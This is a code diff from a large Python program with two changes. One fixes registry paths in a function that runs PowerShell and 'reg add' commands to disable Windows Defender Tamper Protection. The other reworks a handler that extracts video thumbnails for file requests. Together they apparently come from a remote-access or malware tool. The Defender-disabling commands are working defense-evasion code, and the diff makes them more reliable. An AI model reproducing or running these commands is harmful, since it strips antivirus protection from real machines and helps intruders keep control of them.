@@ -4805,8 +4805,8 @@ def disable_defender_tamper_protection():
         # Tamper Protection prevents registry modifications - must disable first
         tamper_commands = [
             'powershell.exe -Command "Set-MpPreference -DisableTamperProtection $true"',
-            'reg add "HKLM\\SOFTWARE\\Microsoft\\Windows Defender\Features" /v "TamperProtection" /t REG_DWORD /d 0 /f',
-            'reg add "HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows Defender\Features" /v "TamperProtection" /t REG_DWORD /d 0 /f',
+            'reg add "HKLM\\SOFTWARE\\Microsoft\\Windows Defender\\Features" /v "TamperProtection" /t REG_DWORD /d 0 /f',
+            'reg add "HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows Defender\\Features" /v "TamperProtection" /t REG_DWORD /d 0 /f',
         ]
         
         for cmd in tamper_commands:
@@ -9940,15 +9940,37 @@ def on_request_file_thumbnail(data):
             cap = cv2.VideoCapture(file_path)
             frame = None
             try:
-                cap.set(cv2.CAP_PROP_POS_MSEC, 1000)
-                ok, frm = cap.read()
-                if ok:
-                    frame = frm
-                else:
+                total_frames = int(cap.get(cv2.CAP_PROP_FRAME_COUNT) or 0)
+                fps = float(cap.get(cv2.CAP_PROP_FPS) or 0.0)
+                duration_ms = None
+                if fps > 0.0 and total_frames > 0:
+                    duration_ms = int((total_frames / fps) * 1000)
+
+                candidate_ms = []
+                if duration_ms and duration_ms > 0:
+                    candidate_ms.extend([min(250, duration_ms - 1), min(1000, duration_ms - 1), int(max(0, duration_ms * 0.1))])
+                candidate_ms.append(0)
+
+                seen = set()
+                for pos in candidate_ms:
+                    if pos in seen:
+                        continue
+                    seen.add(pos)
+                    cap.set(cv2.CAP_PROP_POS_MSEC, pos)
+                    ok, frm = cap.read()
+                    if ok and frm is not None and getattr(frm, 'size', 0) > 0:
+                        frame = frm
+                        break
+
+                if frame is None:
                     cap.set(cv2.CAP_PROP_POS_FRAMES, 0)
-                    ok2, frm2 = cap.read()
-                    if ok2:
-                        frame = frm2
+                    for _ in range(30):
+                        ok, frm = cap.read()
+                        if not ok:
+                            break
+                        if frm is not None and getattr(frm, 'size', 0) > 0:
+                            frame = frm
+                            break
             finally:
                 cap.release()
             if frame is not None:
